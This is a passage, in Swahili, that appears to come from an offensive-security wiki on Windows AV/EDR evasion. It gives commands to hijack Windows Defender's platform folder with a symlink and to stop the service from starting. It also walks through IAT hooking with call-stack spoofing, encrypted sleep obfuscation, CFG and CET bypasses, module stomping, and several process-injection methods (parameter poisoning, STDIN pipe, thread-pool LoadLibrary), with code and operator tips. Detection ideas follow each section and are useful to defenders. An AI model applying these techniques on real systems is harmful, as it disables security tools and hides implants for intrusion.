set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda symlink ya directory ya toleo la juu zaidi ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (kuwasha upya kunapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kuwa MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa upya:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya process chini ya `C:\TMP\AV\` na usanidi wa service/registry unaoonyesha eneo hilo.

Chaguo za post-exploitation
- DLL sideloading/code execution: Weka/badilisha DLL ambazo Defender hupakia kutoka kwenye saraka yake ya programu ili kutekeleza code katika processes za Defender. Tazama sehemu iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili kwenye start inayofuata njia iliyosanidiwa isitatuliwe na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Kumbuka kuwa technique hii haitoi privilege escalation yenyewe; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamishia runtime evasion kutoka kwenye C2 implant hadi kwenye target module yenyewe kwa ku-hook Import Address Table (IAT) yake na kuelekeza API zilizochaguliwa kupitia position‑independent code (PIC) inayodhibitiwa na mshambuliaji. Hii hueneza evasion zaidi ya API chache ambazo kits nyingi hutoa (k.m., CreateProcessA), na kupanua ulinzi huo huo hadi kwenye BOFs na post‑exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Mbinu ya jumla
- Stage PIC blob pamoja na target module kwa kutumia reflective loader (iliyowekwa mwanzoni au kama companion). PIC lazima iwe self‑contained na position‑independent.
- Host DLL inapopakiwa, pitia IMAGE_IMPORT_DESCRIPTOR yake na urekebishe IAT entries za imports zinazolengwa (k.m., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ili zielekeze kwenye PIC wrappers nyepesi.
- Kila PIC wrapper hutekeleza evasions kabla ya kuita real API address kwa tail-call. Evasions za kawaida ni pamoja na:
  - Kuficha/kufichua memory kuzunguka call (k.m., encrypt beacon regions, RWX→RX, kubadilisha majina/ruhusa za page), kisha kurejesha hali baada ya call.
  - Call-stack spoofing: kuunda stack isiyo na madhara na kuingia kwenye target API ili call-stack analysis itambue frames zinazotarajiwa.<sup>[[9]](#references)</sup>
- Kwa compatibility, export interface ili Aggressor script (au inayolingana nayo) iweze kusajili API za ku-hook kwa Beacon, BOFs na post-ex DLLs.

Kwa nini utumie IAT hooking hapa
- Hufanya kazi kwa code yoyote inayotumia import iliyo-hookiwa, bila kurekebisha tool code au kutegemea Beacon ku-proxy API mahususi.
- Hushughulikia post-ex DLLs: ku-hook LoadLibrary* hukuwezesha kunasa module loads (k.m., System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hiyohiyo kwenye API calls zake.
- Hurejesha matumizi ya kuaminika ya post-ex commands zinazozindua processes dhidi ya detections zinazotegemea call-stack kwa ku-wrap CreateProcessA/W.

Mchoro mdogo wa IAT hook (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Maelezo
- Tekeleza patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr huonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ndogo na salama kwa PIC; tafuta API halisi kupitia thamani ya awali ya IAT uliyonasa kabla ya patching au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na epuka kuacha kurasa zikiwa writable+executable.

Stub ya call-stack spoofing
- PIC stubs za mtindo wa Draugr huunda fake call chain (return addresses zinazoelekeza kwenye modules zisizo na madhara) kisha hubadilisha mwelekeo hadi kwenye API halisi.
- Hii hushinda detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs kwenda kwenye APIs nyeti.
- Ziunganishe na mbinu za stack cutting/stack stitching ili kuingia ndani ya frames zinazotarajiwa kabla ya prologue ya API.

Ujumuishaji wa kiutendaji
- Ongeza reflective loader mwanzoni mwa post-ex DLLs ili PIC na hooks zianzishe kiotomatiki DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zinufaike moja kwa moja na njia ileile ya evasion bila mabadiliko ya code.

Mazingatio ya Detection/DFIR
- Uadilifu wa IAT: entries zinazoelekeza kwenye anwani zisizo za image (heap/anon); uthibitishaji wa mara kwa mara wa import pointers.
- Hitilafu za stack: return addresses zisizomilikiwa na images zilizopakiwa; mabadiliko ya ghafla kwenda kwenye PIC isiyo ya image; ukoo wa RtlUserThreadStart usiolingana.
- Telemetry ya loader: writes za ndani ya mchakato kwenye IAT, shughuli za mapema za DllMain zinazobadilisha import thunks, RX regions zisizotarajiwa zinazoundwa wakati wa kupakia.
- Kukwepa image-load: ikiwa unahook LoadLibrary*, fuatilia upakiaji unaotiliwa shaka wa automation/clr assemblies unaohusiana na matukio ya memory masking.

Vipengele vya msingi na mifano vinavyohusiana
- Reflective loaders zinazofanya IAT patching wakati wa kupakia (mfano, TitanLdr, AceLdr)
- Memory masking hooks (mfano, simplehook) na stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (mfano, Draugr)


## IAT Hooking Wakati wa Import + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks wakati wa import kupitia PICO inayokaa kwenye kumbukumbu

Ikiwa unadhibiti reflective loader, unaweza kuhook imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya loader ya `GetProcAddress` na resolver maalum inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Unda **resident PICO** (persistent PIC object) inayobaki baada ya transient loader PIC kujifuta.
- Export function ya `setup_hooks()` inayobadilisha import resolver ya loader (mfano, `funcs.GetProcAddress = _GetProcAddress`).
- Katika `_GetProcAddress`, ruka ordinal imports na utumie hook lookup inayotegemea hash kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; la sivyo, peleka ombi kwa `GetProcAddress` halisi.
- Sajili hook targets wakati wa link kupitia entries za Crystal Palace `addhook "MODULE$Func" "hook"`. Hook hubaki halali kwa sababu iko ndani ya resident PICO.

Hii hutoa **IAT redirection wakati wa import** bila kupatch code section ya DLL iliyopakiwa baada ya kupakia.

### Kulazimisha imports zinazoweza kuhukiwa wakati target inatumia PEB-walking

Hooks za wakati wa import huwashwa tu ikiwa function imo kwenye IAT ya target. Ikiwa module inatafuta APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili njia ya `ProcessImports()` ya loader iione:

- Badilisha utatuzi wa exports unaotumia hash (mfano, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na rejeleo la moja kwa moja kama `&WaitForSingleObject`.
- Compiler huunda IAT entry, na hivyo kuwezesha interception wakati reflective loader inapotatua imports.

### Sleep/idle obfuscation ya mtindo wa Ekko bila kupatch `Sleep()`

Badala ya kupatch `Sleep`, hook **primitives halisi za wait/IPC** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, funga mwito ndani ya mnyororo wa obfuscation wa mtindo wa Ekko unaosimba picha iliyo kwenye kumbukumbu wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kupanga mfululizo wa callbacks zinazoita `NtContinue` zikiwa na `CONTEXT` frames zilizotengenezwa.
- Mnyororo wa kawaida (x64): weka picha kuwa `PAGE_READWRITE` → isimba kwa RC4 kupitia `advapi32!SystemFunction032` katika picha nzima iliyomapishwa → fanya wait inayozuia utekelezaji → ifumbue kwa RC4 → **rejesha ruhusa za kila section** kwa kupitia PE sections → toa ishara ya kukamilika.
- `RtlCaptureContext` hutoa `CONTEXT` ya kiolezo; nakili katika frames nyingi na uweke registers (`Rip/Rcx/Rdx/R8/R9`) ili kuita kila hatua.

Maelezo ya kiutendaji: rudisha “success” kwa waits ndefu (mfano, `WAIT_OBJECT_0`) ili caller iendelee huku picha ikiwa imefichwa. Mtindo huu huficha module dhidi ya scanners wakati wa vipindi vya idle na huepuka saini ya kawaida ya “patched `Sleep()`”.

Mawazo ya detection (yanayotegemea telemetry)
- Mfululizo wa `CreateTimerQueueTimer` callbacks zinazoelekeza kwenye `NtContinue`.
- Matumizi ya `advapi32!SystemFunction032` kwenye buffers kubwa mfululizo zenye ukubwa wa picha.
- `VirtualProtect` ya range kubwa ikifuatiwa na urejeshaji maalum wa ruhusa za kila section.

### Usajili wa CFG wakati wa runtime kwa sleep-obfuscation gadgets

Kwenye targets zilizowezeshwa CFG, indirect jump ya kwanza kwenda kwenye gadget ya katikati ya function kama `jmp [rbx]` au `jmp rdi` kwa kawaida itasababisha mchakato ku-crash kwa `STATUS_STACK_BUFFER_OVERRUN` kwa sababu gadget haipo kwenye metadata ya CFG ya module. Ili kuweka minyororo ya mtindo wa Ekko/Kraken ikiendelea kufanya kazi ndani ya michakato iliyoimarishwa:<sup>[[30]](#references)</sup>

- Sajili kila indirect destination inayotumiwa na mnyororo kupitia `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na entries za `CFG_CALL_TARGET_VALID`.
- Kwa anwani zilizo ndani ya images zilizopakiwa (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ifunike **ukubwa wote wa image**.
- Kwa maeneo yaliyomapishwa kwa mkono/PIC/stomped, tumia **allocation base** na allocation size badala yake.
- Weka alama si kwa dispatch gadget pekee, bali pia kwa exports zinazofikiwa kwa njia isiyo ya moja kwa moja (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na sehemu zozote za executable zinazodhibitiwa na mshambuliaji ambazo zitakuwa indirect targets.

Hii hugeuza sleep chains za aina ya ROP/JOP kutoka “hufanya kazi tu kwenye michakato isiyo na CFG” kuwa primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizojengwa kwa `/guard:cf`.

### Stack spoofing salama kwa CET kwa threads zinazolala

Kubadilisha `CONTEXT` nzima kunaonekana wazi na kunaweza kushindwa kwenye mifumo ya CET Shadow Stack kwa sababu `Rip` iliyoghushiwa lazima bado ilingane na hardware shadow stack. Muundo salama zaidi wa sleep-masking ni:<sup>[[30]](#references)</sup>

- Chagua thread nyingine katika mchakato huohuo na usome mipaka ya stack ya `NT_TIB` / TEB yake (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya thread ya sasa.
- Nasa context halisi ya thread inayolala kwa `GetThreadContext`.
- Nakili **`Rip` halisi pekee** kwenye spoof context, huku ukiacha hali ya `Rsp`/stack iliyoghushiwa kama ilivyo.
- Wakati wa kipindi cha sleep, nakili `NT_TIB` ya thread ya spoof kwenye TEB ya sasa ili stack walkers zifuatilie stack ndani ya range halali.
- Baada ya wait kukamilika, rejesha TIB ya awali na thread context.

Hii huhifadhi instruction pointer inayolingana na CET huku ikipotosha EDR stack walkers zinazotegemea metadata ya stack ya TEB kuthibitisha unwinds.

### Mbadala wa APC: Kraken Mask

Ikiwa timer-queue dispatch inatambulika kwa urahisi na saini, mfuatano huohuo wa sleep-encrypt-spoof-restore unaweza kutekelezwa kutoka kwa helper thread iliyosimamishwa kwa kutumia queued APCs:<sup>[[27]](#references)</sup>

- Unda helper thread yenye `NtTestAlert` kama entrypoint.
- Weka foleni ya `CONTEXT` frames/APCs zilizotayarishwa kupitia `NtQueueApcThread` na uzitekeleze kupitia `NtAlertResumeThread`.
- Hifadhi hali ya mnyororo kwenye heap badala ya helper stack ili kuepuka kuijaza default thread stack ya 64 KB.
- Tumia `NtSignalAndWaitForSingleObject` kutoa ishara kwa start event na kuzuia utekelezaji kwa operesheni moja.
- Simamisha main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza muda wa race ambapo scanner inaweza kunasa stack ambayo haijarejeshwa kikamilifu.

Hii hubadilisha saini ya `CreateTimerQueueTimer` + `NtContinue` na kuwa saini ya helper-thread/APC huku ikidumisha malengo yaleyale ya RC4 masking na stack-spoofing.

Mawazo ya ziada ya detection
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits, au APC dispatch.
- `GetThreadContext`/`SetThreadContext` zinazotumika pamoja na `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatiwa na writes za moja kwa moja kwenye mipaka ya stack ya TEB/TIB ya thread ya sasa.
- Minyororo ya `NtQueueApcThread`/`NtAlertResumeThread` inayofikia kwa njia isiyo ya moja kwa moja `SystemFunction032`, `VirtualProtect`, au helpers za kurejesha ruhusa za sections.
- Matumizi yanayojirudia ya gadget signatures fupi kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya modules zilizotiwa sahihi.


## Precision Module Stomping

Module stomping huendesha payloads kutoka kwenye **`.text` section ya DLL ambayo tayari ime-mapishwa ndani ya mchakato lengwa** badala ya kutenga executable memory ya faragha inayoonekana wazi au kupakia sacrificial DLL mpya. Lengo la overwrite linapaswa kuwa **image iliyopakiwa kutoka kwenye diski**, ambayo nafasi yake ya code inaweza kuchukua payload bila kuharibu code paths ambazo mchakato bado unahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Kuchagua target inayoaminika

Stomping ya moja kwa moja dhidi ya modules za kawaida kama `uxtheme.dll` au `comctl32.dll` si ya kutegemewa: DLL inaweza kuwa haijapakiwa kwenye mchakato wa mbali, na code region iliyo ndogo mno itasababisha mchakato ku-crash. Mchakato unaotegemewa zaidi ni:

1. Orodhesha modules za mchakato lengwa na uhifadhi **orodha ya majina pekee** ya DLL zilizopakiwa tayari.
2. Tengeneza payload kwanza na urekodi **ukubwa wake kamili kwa bytes**.
3. Changanua DLL zinazoweza kutumika kwenye diski na ulinganishe PE section **`.text` `Misc_VirtualSize`** na ukubwa wa payload. Hili ni muhimu zaidi kuliko ukubwa wa file kwa sababu linaonyesha ukubwa wa executable section **inapomapishwa kwenye kumbukumbu**.
4. Changanua **Export Address Table (EAT)** na uchague RVA ya function iliyosafirishwa kama offset ya kuanzia ya stomp.
5. Kokotoa **blast radius**: ikiwa payload ni kubwa kuliko mpaka wa function iliyochaguliwa, itafunika exports zilizo karibu zilizopangwa baada yake kwenye kumbukumbu.

Helpers za kawaida za recon/uchaguzi zinazoonekana kwenye mifumo halisi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Vidokezi vya uendeshaji
- Pendelea DLL ambazo **tayari zimepakiwa** katika mchakato wa mbali ili kuepuka telemetry ya `LoadLibrary`/upakiaji wa picha usiotarajiwa.
- Pendelea exports ambazo programu lengwa huzitekeleza mara chache; vinginevyo, njia za kawaida za msimbo zinaweza kufikia bytes zilizostompwa kabla au baada ya kuunda thread.
- Mara nyingi implants kubwa huhitaji kubadilisha jinsi shellcode inavyopachikwa, kutoka literal ya string hadi **byte-array/braced initializer**, ili buffer nzima iwakilishwe kwa usahihi katika source ya injector.

Mawazo ya ugunduzi
- Uandishi wa mbali kwenye kurasa zinazoweza kutekelezwa na zinazoungwa mkono na image (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya allocations za kawaida zaidi za private RWX/RX.
- Entry points za export ambazo bytes zake kwenye memory hazilingani tena na faili msingi iliyo kwenye diski.
- Remote threads au pivots za context zinazoanza kutekelezwa ndani ya export halali ya DLL ambayo bytes zake za mwanzo zimebadilishwa hivi karibuni.
- Mifuatano ya kutiliwa shaka ya `VirtualProtect(Ex)` / `WriteProcessMemory` dhidi ya kurasa za `.text` za DLL, ikifuatiwa na uundaji wa thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni mbinu ya **process-injection / EDR-evasion** inayokwepa njia ya kawaida ya remote write (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes kwenye target ambayo tayari inaendeshwa, inatumia ukweli kwamba Windows **hunakili baadhi ya vigezo vya uanzishaji vya `CreateProcessW` kwenye child process** na kuvihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers zinazoweza kuwekewa sumu na kunakiliwa na `CreateProcessW`

Carriers zinazofaa ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (pamoja na `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vikwazo vya carriers katika matumizi ya vitendo:

- `lpCommandLine` lazima ielekeze kwenye **memory inayoweza kuandikwa** kwa ajili ya `CreateProcessW`, na ina kikomo cha **herufi 32,767 za Unicode** ikijumuisha terminator ya null.
- `lpEnvironment` lazima iwe block ya mazingira ya Unicode yenye strings mfululizo za `NAME=VALUE\0` zinazoishia kwa `\0` ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hivyo mapping ya `ShellInfo` inapaswa kuchukuliwa kama maelezo ya utekelezaji badala ya mkataba thabiti ulioandikwa rasmi.

Hii hugeuza uundaji wa kawaida wa mchakato kuwa **primitive ya kuhamisha payload**. Operator huunda child process yenye data ya uanzishaji inayodhibitiwa na mshambuliaji na kuiacha Windows ifanye nakala kati ya michakato.

### Mtiririko wa remote lookup bila remote write APIs

Baada ya child kuundwa, tafuta buffer iliyonakiliwa kwa kutumia primitives za **kusoma pekee**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma `PEB` ya mbali
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Mtiririko wa chini kabisa:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kuendesha buffer ya parameter iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida huwa `RW`, si la kutekelezeka. Mlolongo wa kawaida wa P3 ni:

1. Unda process kama kawaida (bila kuisimamisha)
2. Fanya ukurasa uliochaguliwa wa parameter uweze kutekelezeka kwa `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena handle ya main thread iliyorejeshwa tayari kwenye `PROCESS_INFORMATION`
4. Elekeza upya utekelezaji kwa `NtSetContextThread` (`CONTEXT_CONTROL`, badilisha `RIP`)

Tofauti na workflows za kawaida za thread hijacking, hili **halihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kupitia handle ya main thread iliyorejeshwa.

Hili huepuka API kadhaa ambazo hufuatiliwa mara nyingi kwa ajili ya injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kizuizi cha null-byte na shellcode ya hatua kwa hatua

Njia zote tatu za kubeba payload ni **data ya string au inayofanana na string**, kwa hivyo payload ghafi iliyo na `0x00` hukatwa wakati wa uhamishaji. Suluhisho la vitendo ni **hatua ya kwanza isiyo na null** inayounda upya constants wakati wa runtime, kisha kupakia hatua ya pili yoyote.

Mbinu rahisi ni usanisi wa constants unaotegemea XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Hii huruhusu hatua ya kwanza kuunda strings kwenye stack, hoja za API, njia za DLL, au loader ya shellcode ya hatua ya pili bila kuweka null bytes ndani ya parameter inayosafirishwa.

### Miito ya API inayotumia stack kutoka hatua ya kwanza

Hatua ya kwanza inapohitaji kuita API kama `LoadLibraryA`, inaweza:

- kuweka string/buffer kwenye stack ya mchakato lengwa
- kuhifadhi **32-byte x64 shadow space**
- kuweka `RCX`, `RDX`, `R8`, `R9` ziwe constants au pointers zinazohusiana na `RSP`
- kuhakikisha `RSP` **imepangiliwa kwa 16-byte** kabla ya mwito

Kisha hatua ya pili inaweza kunakiliwa kutoka kwenye stack hadi kwenye allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa kutumia `VirtualProtect`, na kurukia huko, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Mawazo ya ugunduzi

Fursa nzuri za kutafuta zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` zinazofanya **kurasa za process-parameter ziweze kutekeleza**
- mabadiliko hayo ya protection yakifuatiwa na `SetThreadContext` / `NtSetContextThread`
- usomaji wa mbali wa `PEB` kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zilizo ndefu au zenye entropy kubwa isivyo kawaida wakati wa kuunda mchakato

### Maelezo

- P3 ni **mbinu ya kuhamisha data kati ya michakato**, si primitive kamili ya utekelezaji yenyewe: parameter iliyonakiliwa bado inahitaji mabadiliko ya ruhusa ya utekelezaji na mbinu ya kuelekeza utekelezaji.
- Waandishi walizingatia `RtlCreateProcessReflection` / Dirty Vanity lakini wakaikataa kwa sababu ndani yake hutumia primitives zinazotia shaka kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

Kwa uwasilishaji wa payload kwenye mchakato wa Windows **uliopo tayari** kupitia thread descriptions, kisha utekaji wa return address ya thread inayosubiri, tazama [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Uingizaji kupitia pipe ya Console STDIN

Mchakato mtoto wa console unaoingiliana unaweza pia kutumiwa kama **primitive ya kuhamisha payload**. Injector huelekeza standard input ya mtoto kwenye pipe na kutuma marker ikifuatiwa na shellcode. Baada ya programu ya console kusoma data kwenye memory yake binafsi, injector hupata buffer hiyo, huifanya iweze kutekeleza na kuelekeza thread ya mtoto iende huko. Hii huepuka `VirtualAllocEx` na `WriteProcessMemory`, lakini bado ni process injection, si bypass ya jumla ya EDR.<sup>[[41]](#references)</sup>

Licha ya maelezo ya "named-pipe", utekelezaji wa marejeo hutumia `CreatePipe`, ambayo huunda **anonymous pipe**. Windows hutekeleza anonymous pipes kwa kutumia vitu vya pipe vyenye majina ya kipekee ndani ya mfumo, lakini PoC haichagui njia ya `\\.\pipe\<name>` wala kuita `CreateNamedPipe`. Huunda handles zinazoweza kurithiwa zikiwa na security descriptor ya chaguo-msingi, huweka handle ya kusoma katika `STARTUPINFO.hStdInput`, huweka `STARTF_USESTDHANDLES`, na huzindua mtoto mpya huku urithishaji wa handle ukiwa umewashwa. Kwa hiyo, PoC hii huzindua console executable iliyotolewa; haiunganishi pipe yake kwenye mchakato uliopo.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Mtiririko wa marejeo

Utekelezaji hutumia mnyororo ufuatao:<sup>[[41]](#references)</sup>

1. Unda jozi za anonymous pipe kwa `STDIN` na `STDOUT` za mtoto. Zima urithishaji kwenye handles mbili za upande wa mzazi na ufunge nakala za upande wa mtoto kwenye mzazi baada ya kuunda mchakato.
2. Zindua executable inayoingiliana kama `netsh.exe` au `nslookup.exe` kwa kutumia `CREATE_NEW_CONSOLE`. Mtoto hurithi handles za kawaida zilizoelekezwa upya.
3. Tuma array kamili ya binary ya `rawData` kwa `WriteFile` kupitia handle ya `STDIN` ya upande wa mzazi. Programu ya console hutumia bytes hizo na kuacha nakala katika mojawapo ya maeneo yake binafsi yaliyotengewa memory.
4. Kagua nafasi ya anwani ya mtoto kwa kutumia `VirtualQueryEx`, soma maeneo yanayoweza kuwa `MEM_PRIVATE` kwa `ReadProcessMemory`, na utafute marker mwanzoni mwa `rawData`.
5. Badilisha buffer iliyogunduliwa iwe `PAGE_EXECUTE_READWRITE` kwa kutumia `VirtualProtectEx`.
6. Tambua thread kuu, isimamishe, weka `RIP` iwe `found_address + 0x19` kwa `NtSetContextThread`, kisha iendelee.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Utekelezaji uliotolewa ni maalum kwa x64: hurekebisha `CONTEXT.Rip`, na payload yake iliyopachikwa ni shellcode ya x64. `rawData` huanza na alama ya baiti 25, hivyo baiti zinazoweza kutekelezwa huanza kwenye offset ya hexadecimal `0x19`. Unapobadilisha payload, hifadhi mpangilio huo au usasishe alama, search vector, ukubwa wa array na offset ya utekelezaji kwa pamoja. Maoni kwenye chanzo pia yanaorodhesha `0x0A`, `0x0D` na `0x1A` kama vibambo visivyofaa. Workflow hii haibadilishi token au marupurupu ya child process.<sup>[[41]](#references)</sup>

Kwa mifumo ya kuunda native helpers ndogo na payloads, angalia [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection ya thread-pool callback bila shellcode (DLLParty)

DLLParty hubadilisha thread-pool injection ya mtindo wa PoolParty ili worker iliyopo ya target iite `LoadLibraryA`, badala ya kutekeleza callback stub iliyoingizwa. Primitive yake ya dispatch ni completion ya `TP_DIRECT` inayowekwa kwenye foleni ya I/O completion port ya pool ya target. Hii haikwepi ruhusa za process: PoC huita `OpenProcess(PROCESS_ALL_ACCESS)` na inahitaji kumbukumbu ya target inayoweza kusomwa/kuandikwa pamoja na handles za worker-factory na completion-port zinazoweza kunakiliwa.<sup>[[46]](#references)[[47]](#references)</sup>

Kwenye Windows x64, worker hupitisha pointer ya `TP_CALLBACK_INSTANCE` iliyo kwenye stack yake kupitia `RCX`, argument ya kwanza ya callback. `LoadLibraryA` hutafsiri pointer hiyo hiyo kama `LPCSTR`. Kwenye njia iliyojaribiwa, `TppWorkerThread` huunda pointer kwenye `RSP+0x178`, ilhali uandishi wake wa kwanza wa kawaida kwenye object hiyo hufanyika kwenye `RSP+0x1d0`. Kwa hiyo, njia ya DLL iliyomaliziwa na null na inayotoshea ndani ya prefix hii ya baiti 0x58 inaweza kuwekwa mwanzoni mwa instance bila kufutwa kabla ya dispatch. Huu ni uchunguzi maalum kwa build iliyojaribiwa, si dhamana iliyoandikwa ya Windows ABI.<sup>[[46]](#references)[[47]](#references)</sup>

Workflow ya marejeo ni:<sup>[[46]](#references)[[47]](#references)</sup>

1. Orodhesha handles za target kwa kutumia `NtQuerySystemInformation(SystemHandleInformation)` na utambue `TpWorkerFactory` kwa kuuliza aina za object. Nakili handle ya worker-factory na uulize `WorkerFactoryBasicInformation`; `StartParameter` hutoa `TP_POOL` ya mbali. Ruka factories zenye `TotalWorkerCount == 0`.
2. Soma `TP_POOL.CompletionPort` na pitia orodha binafsi ya workers ya pool. Kwenye build ya Windows 10 19045 x64 iliyojaribiwa (`ntdll.dll 10.0.19041.4842`), kichwa chake kiko kwenye `pool+0x60`; kila kiungo kiko kwenye `worker+0x10`, kwa hiyo nafasi ya callback-instance kwenye `worker+0x38` ni sawa na `link+0x28`. PoC hukagua mpangilio wa pointer, ulinganifu wa viungo, umiliki wa pool, thread IDs zisizo sifuri, nodes zinazojirudia na kichwa cha orodha kisichobadilika.
3. Andika njia ya DLL kwenye nafasi **zote** za workers zilizopatikana kwa sababu completion iliyowekwa kwenye foleni inaweza kuchukuliwa na worker yeyote. Weka `TP_DIRECT` kwenye kumbukumbu ya target inayoweza kuandikwa, huku `Callback = LoadLibraryA`. PoC hutumia `last_slot-0x500` kwenye stack ya worker badala ya `VirtualAllocEx`; offset hiyo ni ya majaribio na haipaswi kugongana na data ya stack inayotumika.
4. Nakili handle ya completion-port ya target na uite `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Anwani ya mbali ya `TP_DIRECT` ndiyo completion key. Kisha worker iliyopo huita `LoadLibraryA` kwa kutumia pointer ya callback-instance iliyobadilishwa na kupakia DLL ambayo target inaweza kufikia.

